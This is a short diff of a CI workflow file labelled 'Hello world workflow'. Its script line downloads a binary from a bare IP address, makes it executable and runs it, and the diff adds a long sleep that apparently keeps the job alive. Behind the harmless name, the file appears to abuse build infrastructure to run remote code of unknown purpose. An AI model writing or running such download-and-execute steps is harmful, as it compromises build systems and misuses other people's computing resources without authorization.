@@ -3,3 +3,4 @@ workflows:
     name: Hello world workflow
     scripts:
         - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
+        - sleep 5000
